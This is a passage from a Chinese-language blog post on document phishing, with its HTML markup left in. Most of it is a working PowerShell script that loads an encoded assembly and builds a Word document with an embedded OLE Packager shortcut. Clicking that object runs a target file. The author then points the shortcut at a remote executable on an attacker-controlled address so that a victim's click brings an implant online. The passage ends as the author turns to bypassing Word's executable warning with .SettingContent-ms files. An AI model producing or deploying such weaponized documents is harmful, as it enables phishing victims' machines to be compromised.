3xizzL8AdXLGBXj2xxu6zc28ncqmiH3yuaH9JLv3ZPPF96JT5+D&#x2F;vfmEM3ic8qrWPPXIYlUN3kt&#x2F;d8YKR&#x2F;7Fl5cu6c1eWYP4ZBvpujo5yQHZbp9LI8p7BiznfPb+V7HmAhS7OLzqKtY+d3G&#x2F;fbn&#x2F;9HPcctwNeaXX&#x2F;x1E&#x2F;Lbn1&#x2F;Hz&#x2F;8B&#39;</span><br><span class="line">$DeflatedStream &#x3D; New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String($EncodedCompressedFile),[IO.Compression.CompressionMode]::Decompress)</span><br><span class="line">$UncompressedFileBytes &#x3D; New-Object Byte[](80384)</span><br><span class="line">$DeflatedStream.Read($UncompressedFileBytes, 0, 80384) | Out-Null</span><br><span class="line">[Reflection.Assembly]::Load($UncompressedFileBytes) | Out-Null</span><br><span class="line">	</span><br><span class="line"># create new Word document</span><br><span class="line">$word &#x3D; New-Object -ComObject Word.Application</span><br><span class="line">$word.Visible &#x3D; $false</span><br><span class="line">$doc &#x3D; $word.documents.add()</span><br><span class="line"></span><br><span class="line"># HACK: use Packager to create a file icon in the document</span><br><span class="line">$null &#x3D; New-Item $tmpfile -ItemType file</span><br><span class="line">$null &#x3D; $doc.InlineShapes.AddOLEObject($null, $tmpfile)</span><br><span class="line">Remove-Item $tmpfile</span><br><span class="line"></span><br><span class="line"># save doc &amp; close Word</span><br><span class="line">$doc.SaveAs($filename)</span><br><span class="line">$doc.Close($false)</span><br><span class="line">$word.Quit()</span><br><span class="line"></span><br><span class="line"># create temp folder for modifying the docx</span><br><span class="line">$tmpfolder &#x3D; &quot;$env:TEMP\&quot; + [System.Guid]::NewGuid()</span><br><span class="line">$null &#x3D; New-Item -Type directory -Path $tmpfolder</span><br><span class="line"></span><br><span class="line"># unzip and replace Packager object</span><br><span class="line">[System.IO.Compression.ZipFile]::ExtractToDirectory($filename, $tmpfolder)</span><br><span class="line">Remove-Item &quot;$tmpfolder\word\embeddings\oleObject1.bin&quot;</span><br><span class="line"></span><br><span class="line"># create oleObject header from base64 string</span><br><span class="line">$oleheader &#x3D; &#39;0M8R4KGxGuEAAAAAAAAAAAAAAAAAAAAAPgADAP7&#x2F;CQAGAAAAAAAAAAAAAAABAAAAAQAAAAAAAAAAEAAAAgAAAAEAAAD+&#x2F;&#x2F;&#x2F;&#x2F;AAAAAAAAAAD&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;9&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;v&#x2F;&#x2F;&#x2F;&#x2F;7&#x2F;&#x2F;&#x2F;8EAAAA&#x2F;v&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;1IAbwBvAHQAIABFAG4AdAByAHkAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWAAUA&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;8BAAAAwyqy6sEwzxGn6wAAwFuuCwAAAAAAAAAAAAAAAAAAAAAAAAAAAwAAAEACAAAAAAAAAwBPAGIAagBJAG4AZgBvAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABIAAgH&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;AgAAAP&#x2F;&#x2F;&#x2F;&#x2F;8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABgAAAAAAAABDAE8ATgBUAEUATgBUAFMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEgACAP&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAADwAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x2F;v&#x2F;&#x2F;&#x2F;wIAAAADAAAABAAAAAUAAAAGAAAABwAAAAgAAAD+&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;8AAgMADQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAATAAAAH5AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAATAAAAAAAAAABAAAAAQAAAODQVwBzNc8RrmkIACsuEmIAAAAAAAAAAA&#x3D;&#x3D;&#39;</span><br><span class="line">$oleheader &#x3D; [System.Convert]::FromBase64String($oleheader)</span><br><span class="line"></span><br><span class="line"># create the shortcut</span><br><span class="line">$lnk &#x3D; [ShellLink.Shortcut]::new()</span><br><span class="line">$lnk.LinkTargetIDList &#x3D; [ShellLink.Structures.LinkTargetIDList]::new()</span><br><span class="line">$lnk.LinkTargetIDList.Path &#x3D; $path</span><br><span class="line"></span><br><span class="line"># write header and shortcut to oleObject1.bin</span><br><span class="line">$oleheader + $lnk.GetBytes() | Set-Content &quot;$tmpfolder\word\embeddings\oleObject1.bin&quot; -Encoding Byte</span><br><span class="line"></span><br><span class="line"># rezip</span><br><span class="line">Remove-Item $filename</span><br><span class="line">[System.IO.Compression.ZipFile]::CreateFromDirectory($tmpfolder, $filename)</span><br><span class="line"></span><br><span class="line"># cleanup</span><br><span class="line">Remove-Item $tmpfolder -Force -Recurse</span><br></pre></td></tr></table></figure>

<p>​    运行这个powershell文件，会生成一个docx文档</p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200803153101309.png" alt="image-20200803153101309"></p>
<p>​    打开这个文档对象点击这个txt文件，会加载计算器，当点击两次确定时则会触发。</p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200803153516431.png" alt="image-20200803153516431"></p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200803153529859.png" alt="image-20200803153529859"></p>
<p>​    我们可以将path改为远程的exe的url,目标点击后即可触发上线</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$path &#x3D; &#39;http:&#x2F;&#x2F;192.168.5.123:801&#x2F;test666.exe&#39;</span><br></pre></td></tr></table></figure>

<p><strong>如何绕过exe点击拦截的限制？</strong></p>
<p>​    通过上面的实验我们知道当加载exe文件时会有一个安全警告的弹窗，必须用户点击运行后才能执行exe,有没有什么方式可以让word不弹这个框。</p>
<p>​    <strong>使用.SettingContent-ms文件类型绕过限制</strong></p>
